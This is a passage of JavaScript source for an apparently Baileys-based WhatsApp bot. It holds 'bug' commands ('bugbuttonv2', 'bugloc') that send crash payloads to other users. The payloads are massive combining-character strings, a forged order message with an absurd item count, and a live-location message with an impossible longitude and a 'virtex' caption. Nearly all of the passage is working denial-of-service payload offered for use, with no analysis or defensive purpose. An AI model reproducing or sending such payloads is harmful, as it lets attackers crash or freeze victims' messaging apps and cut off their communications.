ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ𝟗𝟗𝟗`,
								},
								"type": "RESPONSE"								
							}
						],
						"headerType": "EMPTY"
					}
}, {quoted:{
                key: {
                participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                },
                message: {
                orderMessage: {
                itemCount: 99999999,
                status: 1
                ,surface: 10,
                orderTitle: 'bugbuttonv2〽', //
                sellerJid: '0@s.whatsapp.net'
                }}}})
Hanz.relayWAMessage(res)
break
//ᗷᑌᘜ ᒪIᐯᗴ ᒪOKᗩՏI
case 'bugloc':            
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
await Hanz.relayWAMessage(Hanz.prepareMessageFromContent(from, Hanz.prepareDisappearingMessageSettingContent(0),{}),{ waitForAck: true });
            res = await Hanz.prepareMessageFromContent(from,{
				"liveLocationMessage": {
						"degreesLatitude": 34.0184,
						"degreesLongitude": -7493855112275230,
						"caption": `${virtex2(prefix)}-${virtex7(prefix)}-️${virtex3(prefix)}🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢